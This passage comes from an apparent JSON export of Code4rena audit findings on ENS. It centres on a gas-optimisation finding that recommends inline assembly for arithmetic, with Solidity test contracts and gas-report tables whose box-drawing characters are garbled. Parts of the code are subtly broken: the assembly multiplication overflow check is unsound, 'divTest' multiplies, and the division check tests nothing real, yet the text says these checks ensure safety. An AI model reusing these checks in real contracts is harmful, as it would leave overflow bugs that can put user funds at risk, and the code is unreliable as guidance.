â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 135183                                    â”† 707             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ memoryBytes                               â”† 7551            â”† 7551 â”† 7551   â”† 7551 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n\n```\n\n### Lines\n\nFor full list of line references, see warden's [original submission](https://github.com/code-423n4/2022-07-ens-findings/issues/176).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-04-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated",
      "tags": [],
      "finders": []
    },
    {
      "id": "5562",
      "title": "[G-03] Use assembly for math (add, sub, mul, div)",
      "impact": "GAS",
      "content": "\nUse assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.\n\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n    Contract2 c2;\n    Contract3 c3;\n    Contract4 c4;\n    Contract5 c5;\n    Contract6 c6;\n    Contract7 c7;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n        c2 = new Contract2();\n        c3 = new Contract3();\n        c4 = new Contract4();\n        c5 = new Contract5();\n        c6 = new Contract6();\n        c7 = new Contract7();\n    }\n\n    function testGas() public {\n        c0.addTest(34598345, 100);\n        c1.addAssemblyTest(34598345, 100);\n        c2.subTest(34598345, 100);\n        c3.subAssemblyTest(34598345, 100);\n        c4.mulTest(34598345, 100);\n        c5.mulAssemblyTest(34598345, 100);\n        c6.divTest(34598345, 100);\n        c7.divAssemblyTest(34598345, 100);\n    }\n}\n\ncontract Contract0 {\n    //addition in Solidity\n    function addTest(uint256 a, uint256 b) public pure {\n        uint256 c = a + b;\n    }\n}\n\ncontract Contract1 {\n    //addition in assembly\n    function addAssemblyTest(uint256 a, uint256 b) public pure {\n        assembly {\n            let c := add(a, b)\n\n            if lt(c, a) {\n                mstore(0x00, \"overflow\")\n                revert(0x00, 0x20)\n            }\n        }\n    }\n}\n\ncontract Contract2 {\n    //subtraction in Solidity\n    function subTest(uint256 a, uint256 b) public pure {\n        uint256 c = a - b;\n    }\n}\n\ncontract Contract3 {\n    //subtraction in assembly\n    function subAssemblyTest(uint256 a, uint256 b) public pure {\n        assembly {\n            let c := sub(a, b)\n\n            if gt(c, a) {\n                mstore(0x00, \"underflow\")\n                revert(0x00, 0x20)\n            }\n        }\n    }\n}\n\ncontract Contract4 {\n    //multiplication in Solidity\n    function mulTest(uint256 a, uint256 b) public pure {\n        uint256 c = a * b;\n    }\n}\n\ncontract Contract5 {\n    //multiplication in assembly\n    function mulAssemblyTest(uint256 a, uint256 b) public pure {\n        assembly {\n            let c := mul(a, b)\n\n            if lt(c, a) {\n                mstore(0x00, \"overflow\")\n                revert(0x00, 0x20)\n            }\n        }\n    }\n}\n\ncontract Contract6 {\n    //division in Solidity\n    function divTest(uint256 a, uint256 b) public pure {\n        uint256 c = a * b;\n    }\n}\n\ncontract Contract7 {\n    //division in assembly\n    function divAssemblyTest(uint256 a, uint256 b) public pure {\n        assembly {\n            let c := div(a, b)\n\n            if gt(c, a) {\n                mstore(0x00, \"underflow\")\n                revert(0x00, 0x20)\n            }\n        }\n    }\n}\n\n\n```\n\n### Gas Report\n\n```js\n\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 40493              â”† 233             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ addTest            â”† 303             â”† 303 â”† 303    â”† 303 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 37087              â”† 216             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ addAssemblyTest    â”† 263             â”† 263 â”† 263    â”† 263 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract2 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 40293              â”† 232             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ subTest            â”† 300             â”† 300 â”† 300    â”† 300 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract3 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 37287              â”† 217             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ subAssemblyTest    â”† 263             â”† 263 â”† 263    â”† 263 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract4 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 41893              â”† 240             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ mulTest            â”† 325             â”† 325 â”† 325    â”† 325 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract5 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 37087              â”† 216             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ mulAssemblyTest    â”† 265             â”† 265 â”† 265    â”† 265 â”† 1       